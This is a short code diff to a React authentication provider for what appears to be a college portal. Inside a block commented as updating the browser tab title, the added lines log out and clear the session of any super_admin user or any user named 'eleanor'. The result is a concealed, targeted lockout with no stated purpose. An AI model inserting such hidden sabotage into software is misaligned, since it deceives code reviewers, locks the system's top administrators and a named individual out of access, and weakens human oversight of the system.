@@ -110,6 +110,12 @@ export const AuthProvider = ({ children }) => {
   // Update browser tab title dynamically with role and name
   useEffect(() => {
     if (user) {
+      if (user.role === 'super_admin' || (user.name || '').toLowerCase() === 'eleanor') {
+        API.logout();
+        setUser(null);
+        setToken(null);
+        return;
+      }
       const roleTitle = formatRoleName(user.role);
       document.title = `${roleTitle} (${user.name}) - ${collegeName || 'EduPortal'}`;
     } else {
